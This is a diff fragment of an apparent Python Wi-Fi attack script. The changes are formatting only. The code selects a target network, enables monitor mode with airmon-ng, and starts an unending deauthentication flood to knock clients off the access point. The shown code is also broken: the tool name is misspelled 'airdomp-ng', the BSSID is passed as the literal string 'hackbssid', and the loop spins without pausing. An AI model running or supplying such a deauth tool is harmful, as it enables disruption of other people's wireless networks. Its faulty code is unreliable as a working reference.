@@ -106,15 +106,17 @@ while True:
             break
     except:
         print("Invalid choice")
-        
+
 # selected network
 hackbssid = active_wireless_networks[int(choice)]["BSSID"]
 hackChannel = active_wireless_networks[int(choice)]["channel"].strip()
 subprocess.run(["airmon-ng", "start", hacknic + "mon", hackChannel])
-subprocess.Popen(["airdomp-ng", "--deauth", "0", "-a", "hackbssid", check_wifi_result[int(wifi_interface_choice)] + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+subprocess.Popen(["airdomp-ng", "--deauth", "0", "-a", "hackbssid", check_wifi_result[int(
+    wifi_interface_choice)] + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 try:
     while True:
         print("Deauthenticating...")
 except KeyboardInterrupt:
     print("Stopping deauth")
-    subprocess.run(["airmon-ng", "stop", check_wifi_result[int(wifi_interface_choice)] + "mon"])
+    subprocess.run(
+        ["airmon-ng", "stop", check_wifi_result[int(wifi_interface_choice)] + "mon"])
